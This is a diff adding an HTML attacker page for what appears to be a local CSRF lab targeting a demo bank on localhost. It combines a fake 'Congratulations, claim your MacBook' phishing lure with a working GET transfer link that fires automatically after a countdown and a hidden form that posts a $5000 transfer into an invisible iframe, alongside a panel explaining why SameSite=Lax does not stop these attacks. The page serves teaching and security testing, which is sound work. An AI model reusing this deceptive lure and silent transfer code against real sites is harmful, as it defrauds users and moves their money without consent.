@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🎉 You've been selected!</title>
+  <style>
+    :root {
+      --bg: #0d1117; --bg-2: #161b22; --bg-3: #21262d;
+      --border: #30363d; --text: #e6edf3; --text-2: #8b949e;
+      --blue: #58a6ff; --green: #3fb950; --red: #f85149;
+      --orange: #f0883e; --purple: #bc8cff; --yellow: #e3b341;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; min-height: 100vh; }
+
+    /* ── Fake prize banner (what the victim sees) ── */
+    .prize-wrapper { padding: 40px 20px 28px; display: flex; flex-direction: column; align-items: center; }
+    .prize-card {
+      background: linear-gradient(135deg, #1a1040 0%, #161b22 60%);
+      border: 1px solid #6e40c9;
+      border-radius: 12px; padding: 36px 40px; max-width: 500px; width: 100%;
+      text-align: center; box-shadow: 0 0 40px rgba(110,64,201,.25);
+    }
+    .prize-emoji { font-size: 52px; margin-bottom: 16px; }
+    .prize-title { font-size: 26px; font-weight: 800; color: var(--purple); margin-bottom: 8px; }
+    .prize-sub   { color: var(--text-2); font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
+    .prize-item  { background: var(--bg-3); border: 1px solid #6e40c9; border-radius: 8px; padding: 14px 20px; margin-bottom: 20px; font-size: 16px; font-weight: 600; }
+
+    /* GET attack button — looks like a prize CTA */
+    .claim-btn {
+      display: block; width: 100%; padding: 13px;
+      background: var(--purple); border: none; border-radius: 8px;
+      color: #fff; font-size: 15px; font-weight: 700;
+      text-decoration: none; cursor: pointer;
+      transition: opacity .15s; margin-bottom: 10px;
+    }
+    .claim-btn:hover { opacity: .88; }
+
+    .countdown-bar {
+      font-size: 12px; color: var(--text-2); margin-top: 8px;
+      font-family: 'Courier New', monospace;
+    }
+    .countdown-bar span { color: var(--orange); font-weight: 700; }
+
+    /* ── Separator ── */
+    .section-sep { text-align: center; color: var(--text-2); font-size: 11px; letter-spacing: .1em; text-transform: uppercase; padding: 6px 20px 0; max-width: 860px; margin: 0 auto; }
+
+    /* ── Attack payload debug panel ── */
+    .debug-panel {
+      max-width: 860px; margin: 16px auto 40px;
+      background: var(--bg-2); border: 1px solid var(--border); border-radius: 8px;
+      overflow: hidden;
+    }
+    .debug-header {
+      background: var(--bg-3); padding: 10px 18px;
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; gap: 10px;
+    }
+    .debug-header-title { font-size: 11px; font-weight: 700; letter-spacing: .1em; text-transform: uppercase; color: var(--text-2); flex: 1; }
+    .tag { font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 10px; letter-spacing: .05em; text-transform: uppercase; }
+    .tag.attacker { background: rgba(248,81,73,.2); color: var(--red); }
+    .tag.working  { background: rgba(63,185,80,.15); color: var(--green); }
+
+    .debug-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0; }
+    .debug-col { padding: 18px; border-right: 1px solid var(--border); }
+    .debug-col:last-child { border-right: none; }
+
+    .attack-title { font-size: 12px; font-weight: 700; color: var(--text); margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
+    .attack-why { font-size: 11px; color: var(--text-2); margin-bottom: 12px; line-height: 1.6; }
+    .attack-why code { color: var(--blue); font-family: 'Courier New', monospace; }
+    pre {
+      background: var(--bg-3); border: 1px solid var(--border); border-radius: 6px;
+      padding: 12px 14px; font-size: 11px; line-height: 1.7;
+      font-family: 'Courier New', monospace; color: var(--text); overflow-x: auto;
+      margin-bottom: 12px; white-space: pre;
+    }
+    .kw   { color: var(--purple); }
+    .str  { color: var(--green); }
+    .attr { color: var(--blue); }
+    .val  { color: var(--orange); }
+    .cmt  { color: var(--text-2); }
+
+    .btn-attack {
+      width: 100%; padding: 9px; border-radius: 6px; font-size: 13px; font-weight: 700;
+      cursor: pointer; border: 1px solid; transition: opacity .15s;
+    }
+    .btn-attack:hover { opacity: .85; }
+    .btn-get  { background: rgba(248,81,73,.12); border-color: var(--red);    color: var(--red); }
+    .btn-post { background: rgba(188,140,255,.1); border-color: var(--purple); color: var(--purple); }
+
+    .status-line {
+      font-size: 11px; font-family: 'Courier New', monospace; margin-top: 9px;
+      min-height: 16px; color: var(--text-2);
+    }
+    .status-line.ok  { color: var(--green); }
+    .status-line.err { color: var(--red); }
+    .status-line.wrn { color: var(--orange); }
+
+    /* Hidden CSRF iframe */
+    #csrf-iframe { display: none; }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════ VICTIM VIEW — DISGUISE ══════════════ -->
+<div class="prize-wrapper">
+  <div class="prize-card">
+    <div class="prize-emoji">🎉</div>
+    <div class="prize-title">Congratulations!</div>
+    <div class="prize-sub">
+      You have been selected as our monthly lucky winner.<br>
+      Claim your exclusive prize before it expires!
+    </div>
+    <div class="prize-item">🍎 MacBook Pro 16" — worth $3,499</div>
+
+    <!--
+      This link looks like a prize CTA but it's actually a GET CSRF attack URL.
+      Because it's a top-level navigation, the browser includes the victim's
+      session cookie (SameSite=Lax allows cookies on cross-site GET navigations).
+    -->
+    <a id="claim-btn" class="claim-btn" href="http://localhost:38083/api/transfer?to=bob&amount=5000">
+      🎁 Claim Your Prize Now
+    </a>
+
+    <div class="countdown-bar" id="countdown-bar">
+      Auto-triggering GET attack in <span id="count">5</span>s &nbsp;·&nbsp;
+      <a href="#" onclick="cancelCountdown(); return false;" style="color:var(--text-2)">cancel</a>
+    </div>
+  </div>
+</div>
+
+<div class="section-sep">── PENTESTER VIEW — ATTACK PAYLOADS ──</div>
+
+<!-- ══════════════ DEBUG PANEL ══════════════ -->
+<div class="debug-panel">
+  <div class="debug-header">
+    <span class="debug-header-title">CSRF Attack Vectors</span>
+    <span class="tag attacker">Attacker page · localhost:38084</span>
+    <span class="tag working">Target · localhost:38083</span>
+  </div>
+
+  <div class="debug-grid">
+
+    <!-- ── Attack 1: GET navigation ── -->
+    <div class="debug-col">
+      <div class="attack-title">
+        Attack 1 — GET (navigation-based)
+        <span class="tag working">Works with SameSite=Lax</span>
+      </div>
+      <div class="attack-why">
+        A top-level GET navigation (link click or <code>window.location</code>) causes the browser
+        to include <code>SameSite=Lax</code> cookies. The endpoint accepts GET — state change happens.
+        Victim is silently redirected back to the bank.
+      </div>
+<pre><span class="cmt">// Auto-trigger on page load (countdown above)</span>
+<span class="kw">window</span>.location.href =
+  <span class="str">"http://localhost:38083/api/transfer"</span>
+  + <span class="str">"?to=bob&amp;amount=5000"</span>;
+
+<span class="cmt">// Or a disguised &lt;a&gt; tag:</span>
+<span class="kw">&lt;a</span> <span class="attr">href</span>=<span class="str">"http://localhost:38083/api/transfer
+     ?to=bob&amp;amount=5000"</span><span class="kw">&gt;</span>
+  Claim Your Prize
+<span class="kw">&lt;/a&gt;</span></pre>
+      <button class="btn-attack btn-get" onclick="triggerGet()">🔴 Trigger GET Attack</button>
+      <div id="status-get" class="status-line"></div>
+    </div>
+
+    <!-- ── Attack 2: POST form (hidden iframe) ── -->
+    <div class="debug-col">
+      <div class="attack-title">
+        Attack 2 — POST (hidden iframe, stealthy)
+        <span class="tag working">Works same-eTLD</span>
+      </div>
+      <div class="attack-why">
+        <code>localhost:38083</code> and <code>localhost:38084</code> share eTLD <code>localhost</code> —
+        ports are ignored for SameSite. A simple form POST (no JSON, no preflight) sends cookies.
+        Response goes to a hidden iframe — victim never navigates away.
+      </div>
+<pre><span class="kw">&lt;form</span>
+  <span class="attr">id</span>=<span class="str">"csrf-form"</span>
+  <span class="attr">method</span>=<span class="str">"POST"</span>
+  <span class="attr">action</span>=<span class="str">"http://localhost:38083/api/transfer"</span>
+  <span class="attr">target</span>=<span class="str">"csrf-iframe"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> <span class="attr">name</span>=<span class="str">"to"</span>     <span class="attr">value</span>=<span class="str">"bob"</span>  <span class="kw">/&gt;</span>
+  <span class="kw">&lt;input</span> <span class="attr">name</span>=<span class="str">"amount"</span> <span class="attr">value</span>=<span class="str">"5000"</span> <span class="kw">/&gt;</span>
+<span class="kw">&lt;/form&gt;</span>
+
+<span class="cmt">// Submit silently — response blocked but</span>
+<span class="cmt">// the transfer executes on the server</span>
+document.getElementById(<span class="str">"csrf-form"</span>).submit();</pre>
+      <button class="btn-attack btn-post" onclick="triggerPost()">👻 Trigger POST Attack (silent)</button>
+      <div id="status-post" class="status-line"></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Hidden form + iframe for POST attack -->
+<form id="csrf-form" method="POST"
+      action="http://localhost:38083/api/transfer"
+      target="csrf-iframe"
+      style="display:none">
+  <input name="to"     value="bob">
+  <input name="amount" value="5000">
+</form>
+<iframe id="csrf-iframe" name="csrf-iframe"></iframe>
+
+<script>
+  // ── GET attack countdown ──────────────────────────────────────────────────
+  let countVal   = 5;
+  let countTimer = null;
+
+  function startCountdown() {
+    countTimer = setInterval(() => {
+      countVal--;
+      const el = document.getElementById('count');
+      if (el) el.textContent = countVal;
+      if (countVal <= 0) {
+        clearInterval(countTimer);
+        triggerGet();
+      }
+    }, 1000);
+  }
+
+  function cancelCountdown() {
+    clearInterval(countTimer);
+    const bar = document.getElementById('countdown-bar');
+    if (bar) bar.textContent = 'Auto-trigger cancelled.';
+  }
+
+  startCountdown();
+
+  // ── Trigger GET (navigation) ──────────────────────────────────────────────
+  function triggerGet() {
+    cancelCountdown();
+    setStatus('get', 'wrn', '⟳ Navigating to attack URL...');
+    // Small delay so the user can see the status line before navigating away
+    setTimeout(() => {
+      window.location.href = 'http://localhost:38083/api/transfer?to=bob&amount=5000';
+    }, 400);
+  }
+
+  // ── Trigger POST (hidden iframe) ──────────────────────────────────────────
+  function triggerPost() {
+    cancelCountdown();
+    setStatus('post', 'wrn', '⟳ Submitting hidden form...');
+    document.getElementById('csrf-form').submit();
+
+    // The response goes to the iframe — we can't read it (cross-origin).
+    // But the transfer executes on the server. Instruct user to check bank.
+    setTimeout(() => {
+      setStatus('post', 'err',
+        '✗ Response blocked (CORS) — but transfer executed. Check the bank page.');
+    }, 1200);
+  }
+
+  function setStatus(id, cls, msg) {
+    const el = document.getElementById('status-' + id);
+    el.className = 'status-line ' + cls;
+    el.textContent = msg;
+  }
+</script>
+</body>
+</html>
